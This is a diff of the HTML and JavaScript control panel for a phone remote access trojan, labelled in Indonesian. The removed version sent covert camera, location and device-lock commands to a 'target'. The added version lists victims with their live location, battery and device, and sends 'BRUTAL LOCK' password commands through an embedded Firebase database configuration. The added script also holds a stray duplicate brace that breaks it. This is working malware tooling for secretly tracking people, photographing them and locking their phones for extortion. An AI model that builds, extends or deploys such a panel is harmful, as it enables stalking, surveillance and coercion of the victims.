@@ -1,48 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Master Control RAT</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OMNI-CONTROL V.FINAL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <style>
-        body { background: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
-        .card { background: #111; border: 1px solid #00ff00; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
-        button { width: 100%; padding: 12px; margin: 5px 0; background: #003300; color: #0f0; border: 1px solid #0f0; font-weight: bold; }
-        input { width: 100%; padding: 10px; margin: 5px 0; background: #000; color: #0f0; border: 1px solid #333; box-sizing: border-box; }
-        img { width: 100%; margin-top: 10px; border: 1px solid #0f0; }
+        body { background: #050505; color: #00f3ff; font-family: sans-serif; margin: 0; }
+        header { background: #111; padding: 20px; text-align: center; border-bottom: 2px solid #00f3ff; }
+        .container { display: grid; grid-template-columns: 250px 1fr; height: 90vh; }
+        .sidebar { border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
+        .main { padding: 20px; overflow-y: auto; }
+        .target-card { padding: 10px; border: 1px solid #00f3ff; margin-bottom: 10px; cursor: pointer; border-radius: 5px; }
+        .target-card:hover { background: rgba(0,243,255,0.2); }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .box { background: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
+        input, button { padding: 10px; width: 100%; box-sizing: border-box; margin-top: 10px; border-radius: 5px; border: none; }
+        button { background: #ff003c; color: white; cursor: pointer; font-weight: bold; }
+        .btn-unlock { background: #00ff00; color: #000; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-    <h2>OMNI-COMMAND RAT</h2>
+<header><h1 style="font-family:'Orbitron'">OMNI-COMMANDER V.FINAL</h1></header>
 
-    <div class="card">
-        <label>ID TARGET:</label>
-        <input type="text" id="targetID" placeholder="Contoh: Target_1234">
+<div class="container">
+    <div class="sidebar" id="target-list">
+        <h3>TARGET LIST</h3>
+        <div id="list-container">Menunggu data...</div>
     </div>
-
-    <div class="card">
-        <h3>SECURITY LOCK</h3>
-        <input type="text" id="passLock" placeholder="Set Password Unlock untuk korban">
-        <button onclick="sendComplexCmd('lock')" style="background:red; color:white;">LOCK DEVICE</button>
-        <button onclick="sendCmd('unlock')" style="background:white; color:black;">FORCE UNLOCK</button>
+    <div class="main">
+        <h2 id="active-id">PILIH TARGET</h2>
+        <div class="info-grid">
+            <div class="box">LOKASI: <p id="d-loc">-</p></div>
+            <div class="box">BATERAI: <p id="d-batt">-</p></div>
+            <div class="box">PERANGKAT: <p id="d-dev">-</p></div>
+            <div class="box">TERAKHIR: <p id="d-last">-</p></div>
+        </div>
+        <button onclick="window.open('https://www.google.com/maps?q='+document.getElementById('d-loc').innerText)">LACAK DI MAPS</button>
+        <hr style="border:1px solid #333; margin:20px 0;">
+        <div class="box" style="border-color: red;">
+            <h3>BRUTAL LOCK CONTROL</h3>
+            <input type="text" id="pass-val" placeholder="Set Password Lock...">
+            <button onclick="sendCmd('lock')">KIRIM BRUTAL LOCK</button>
+            <button class="btn-unlock" onclick="sendCmd('unlock')">OPEN LOCK / RELEASE</button>
+        </div>
     </div>
+</div>
 
-    <div class="card">
-        <h3>KONTROL SADAP</h3>
-        <button onclick="sendCmd('front')">FOTO DEPAN</button>
-        <button onclick="sendCmd('back')">FOTO BELAKANG</button>
-        <button onclick="sendCmd('loc')">CEK LOKASI</button>
-    </div>
-
-    <div class="card">
-        <h3>MONITORING</h3>
-        <div id="res"></div>
-        <img id="imgRes">
-    </div>
-
-    <script>
-      const firebaseConfig = {
+<script>
+    const firebaseConfig = {
     apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
     authDomain: "remote-control-9bf2c.firebaseapp.com",
     databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -50,30 +59,44 @@
     storageBucket: "remote-control-9bf2c.firebasestorage.app",
     messagingSenderId: "71798344189",
     appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+};
 
-        function sendCmd(cmd) {
-            const id = document.getElementById('targetID').value;
-            db.ref('rat/' + id + '/command').set(cmd);
-            listen(id);
-        }
+    };
 
-        function sendComplexCmd(action) {
-            const id = document.getElementById('targetID').value;
-            const pass = document.getElementById('passLock').value || "1234";
-            db.ref('rat/' + id + '/command').set({ action: action, pass: pass });
-        }
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentId = "";
 
-        function listen(id) {
-            db.ref('rat/' + id + '/shots').limitToLast(1).on('value', s => {
-                const d = s.val(); if(d) {
-                    const k = Object.keys(d)[0];
-                    document.getElementById('imgRes').src = d[k].img;
-                }
-            });
-        }
-    </script>
+    db.ref('targets').on('value', (snap) => {
+        const container = document.getElementById('list-container');
+        container.innerHTML = "";
+        snap.forEach((child) => {
+            const div = document.createElement('div');
+            div.className = "target-card";
+            div.innerText = child.key;
+            div.onclick = () => selectTarget(child.key);
+            container.appendChild(div);
+        });
+    });
+
+    function selectTarget(id) {
+        currentId = id;
+        document.getElementById('active-id').innerText = id;
+        db.ref('targets/' + id).on('value', (snap) => {
+            const data = snap.val();
+            document.getElementById('d-loc').innerText = data.lat + "," + data.lng;
+            document.getElementById('d-batt').innerText = data.battery + "%";
+            document.getElementById('d-dev').innerText = data.device;
+            document.getElementById('d-last').innerText = data.lastSeen;
+        });
+    }
+
+    function sendCmd(act) {
+        if(!currentId) return alert("Pilih target!");
+        const p = document.getElementById('pass-val').value;
+        db.ref('targets/' + currentId + '/command').set({ action: act, password: p });
+        alert("Command Sent!");
+    }
+</script>
 </body>
 </html>
